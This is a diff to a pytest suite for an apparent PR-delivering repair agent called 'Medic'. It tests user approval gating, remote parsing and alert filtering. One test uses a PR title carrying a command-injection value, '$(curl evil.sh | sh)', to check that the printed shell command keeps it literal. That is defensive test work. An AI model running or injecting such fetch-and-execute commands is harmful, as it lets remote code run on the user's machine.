@@ -16,6 +16,7 @@ from medic import agent as agent_mod
 from medic import dashboard, delivery, paths, project
 from medic.agent import Medic
 from medic.incidents import Incident
+from medic.incidents import save as save_incident     # the real one (pr_medic stubs the module's)
 
 
 @pytest.fixture
@@ -386,10 +387,10 @@ def test_a_ready_pr_is_prepared_but_not_opened_until_the_user_says(pr_medic, mon
     assert ready["commands"][0] == "git push origin medic/fix-inc1"
     assert "gh pr create --repo u/app --base main --head medic/fix-inc1" in ready["commands"][1]
     assert "Agent Medic" in open(ready["body_file"], encoding="utf-8").read()
-    monkeypatch.setattr(delivery, "existing_pr", lambda branch, root: "")
+    monkeypatch.setattr(delivery, "existing_pr", lambda branch, root, closed=False: "")
     m.do_pr_ready(inc)
     assert inc.phase == "pr_ready" and pushed == []                         # still waiting for the user
-    inc.deploy["approved"] = True                                           # agent-medic approve <id>
+    agent_mod.incidents.approve(inc.id)                                    # agent-medic approve <id>
     m.do_pr_ready(inc)
     assert pushed == ["medic/fix-inc1"] and inc.phase == "awaiting_merge" and inc.deploy["pr"]["url"].endswith("/7")
 
@@ -400,7 +401,7 @@ def test_a_ready_pr_opened_by_hand_is_picked_up(pr_medic, monkeypatch):
     monkeypatch.setattr(paths, "PROJECT", project.Project(root=paths.MEDIC_DIR, entrypoint="app:answer", mode="pr",
                                                           pr="ready"))
     m.do_deploy(inc)
-    monkeypatch.setattr(delivery, "existing_pr", lambda branch, root: "https://github.com/u/app/pull/12")
+    monkeypatch.setattr(delivery, "existing_pr", lambda branch, root, closed=False: "https://github.com/u/app/pull/12")
     m.do_pr_ready(inc)
     assert inc.phase == "awaiting_merge" and inc.deploy["pr"]["url"].endswith("/12")
     from dataclasses import asdict
@@ -420,6 +421,60 @@ def test_prs_go_to_the_origin_remote_never_the_upstream(tmp_path):
     assert delivery.repo(tmp_path) == "thebhavye/langchain-rag-tutorial"
     git(tmp_path, "remote", "set-url", "origin", "git@github.com:thebhavye/langchain-rag-tutorial.git")
     assert delivery.repo(tmp_path) == "thebhavye/langchain-rag-tutorial"
+    git(tmp_path, "remote", "set-url", "origin", "https://github.company.com/team/app.git")
+    assert delivery.repo(tmp_path) == "github.company.com/team/app"           # GitHub Enterprise keeps its host
+    git(tmp_path, "remote", "set-url", "origin", "git@github.company.com:team/app.git")
+    assert delivery.repo(tmp_path) == "github.company.com/team/app"
     git(tmp_path, "remote", "set-url", "origin", "https://gitlab.com/x/y.git")
     with pytest.raises(delivery.DeliveryError, match="not a GitHub repo"):
         delivery.repo(tmp_path)
+
+
+def test_an_alert_counts_only_with_sample_traces_from_this_deployment(pr_medic, monkeypatch):
+    m, _ = pr_medic
+    fires = [{"ruleName": "Medic: tool call failed (3 in 5 min)", "sampleTraceIds": []},          # no samples
+             {"ruleName": "Medic: tool call failed (3 in 5 min)", "sampleTraceIds": ["other-app"]},
+             {"ruleName": "Medic: non-answers", "sampleTraceIds": ["ours-1", "other-app"]}]
+    monkeypatch.setattr(m, "_neatlogs", lambda: object(), raising=False)
+    monkeypatch.setattr(agent_mod.neatlogs_link, "new_alerts", lambda api, since=None: fires)
+    m.watcher.evidence_for = lambda ids: [i for i in ids if i.startswith("ours")]   # what the watcher accepts
+    logged = []
+    m.log = logged.append
+    assert [a["ruleName"] for a in m._neatlogs_alerts()] == ["Medic: non-answers"]
+    assert sum("ignored" in line for line in logged) == 2
+
+
+def test_the_printed_commands_never_run_a_model_written_title(tmp_path, monkeypatch):
+    import shlex
+    monkeypatch.setattr(delivery, "repo", lambda root: "u/app")
+    inc = Incident(signals=[], release="b" * 40, healthy_release="a" * 40, trace_ids=[], id="inc1")
+    title = 'Fix $(curl evil.sh | sh) `id` "x"\nsecond line'
+    ready = delivery.prepare_pr(inc, "medic/fix-inc1", "main", title, tmp_path, tmp_path)
+    argv = shlex.split(ready["commands"][1])                              # what a POSIX shell would run
+    assert argv[:3] == ["gh", "pr", "create"]
+    assert argv[argv.index("--title") + 1] == 'Fix $(curl evil.sh | sh) `id` "x" second line'   # literal text
+
+
+def test_a_ready_pr_opened_and_closed_between_checks_ends_the_wait(pr_medic, monkeypatch):
+    m, inc = pr_medic
+    monkeypatch.setattr(delivery, "repo", lambda root: "u/app")
+    monkeypatch.setattr(paths, "PROJECT", project.Project(root=paths.MEDIC_DIR, entrypoint="app:answer", mode="pr",
+                                                          pr="ready"))
+    m.do_deploy(inc)
+    monkeypatch.setattr(delivery, "existing_pr", lambda branch, root, closed=False:
+                        "https://github.com/u/app/pull/13" if closed else "")
+    m.do_pr_ready(inc)
+    monkeypatch.setattr(delivery, "state", lambda url, root: {"state": "CLOSED", "merge_commit": None})
+    m.do_await_merge(inc)
+    assert inc.phase == "escalated"
+
+
+def test_an_approval_survives_the_daemon_saving_its_older_copy(pr_medic, monkeypatch, tmp_path):
+    m, inc = pr_medic
+    from dataclasses import asdict
+    monkeypatch.setattr(paths, "INCIDENTS", tmp_path / "incidents")
+    stale = Incident(**asdict(inc))                                       # the daemon's copy, mid-step
+    agent_mod.incidents.approve(inc.id)                                   # agent-medic approve <id>
+    save_incident(stale)                                                  # the daemon saves its older copy
+    [reloaded] = agent_mod.incidents.load_all()
+    assert agent_mod.incidents.approved(reloaded)                         # the approval survives
